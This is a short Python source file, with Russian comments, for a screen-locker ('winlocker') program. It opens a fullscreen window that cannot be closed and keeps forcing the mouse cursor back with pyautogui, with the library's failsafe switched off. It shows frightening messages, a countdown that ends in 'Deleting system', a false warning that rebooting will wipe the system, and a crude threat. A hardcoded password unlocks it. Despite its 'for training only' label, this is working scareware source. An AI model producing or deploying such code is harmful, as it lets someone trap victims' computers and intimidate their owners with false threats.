from tkinter import *
import pygame
import pyautogui

read1ng = ' '  # Переменная, в которой будет храниться введенный пользователем пароль
password = ("crm")  # Переменная с паролем от локера
t1me = 7200  # Переменная с таймером в секундах
d3l = 'Deleting system'  # Пугалка


# Функция для блокировки экрана
def block():
    pyautogui.click(x=675, y=405)
    pyautogui.moveTo(x=675, y=405)
    screen.protocol("WM_DELETE_WINDOW", block)  # Блок на использование комбинаций закрытия окна
    screen.update()


# Функция для проверки пароля
def check(event):
    global read1ng
    read1ng = field.get()
    if read1ng == password:
        screen.destroy()


# Настройка экрана блокировщика
screen = Tk()
screen.title("Popavsi na pelmeni")  # Название окна
screen.attributes("-fullscreen", True)  # Аттрибуты окна, который делает его на весь экран
screen.configure(background='#1c1c1c')
pyautogui.FAILSAFE = False  # отключение остановки библиотеки autogui при дерганьи мышки.
# Если не включить это, то при дергание мышки pyautogui просто прекратит выполнять все действия.


# Кнопка ввода пароля для разблокировки
field = Entry(screen, fg='green', justify=CENTER)
but = Button(screen, text='Unlock')
text_0 = Label(screen, text='Ваша система заблокирована', font="TimesNewRoman 30", fg="white", bg="#1c1c1c")
text = Label(screen, text='@Hdsak for training only', font='TimesNewRoman 30', fg='#32CD32', bg='#1c1c1c')
text1_alert = Label(screen, text="Не перезагружайте компьютер, это удалит вашу систему!", font="TimesNewRoman 16",
                    fg="red", bg="#1c1c1c")
label_with_time = Label(screen, text=t1me, font='Arial 22', fg='red', bg='#1c1c1c')  # Лейбл таймера
label_time_message = Label(screen, text='Тоби пизда тикай с городу', font='Arial 22', fg='black')
but.bind('<Button-1>', check)
text.place(x=380, y=180)
field.place(width=150, height=50, x=600, y=300)
but.place(width=150, height=50, x=600, y=380)
text_0.place(x=410, y=100)
text1_alert.place(x=410, y=250)
label_time_message.place(x=20, y=70)
label_with_time.place(x=20, y=100)
pygame.init()
aud=pygame.mixer.Sound("message.wav")
aud.play()
screen.update()
pyautogui.click(x=675, y=325)
pyautogui.moveTo(x=660, y=410)
while read1ng != password:
    label_with_time.configure(text=t1me)
    screen.after(300)
    if t1me == 0:
        t1me = d3l
    if t1me != d3l:
        t1me = t1me - 1
    block()
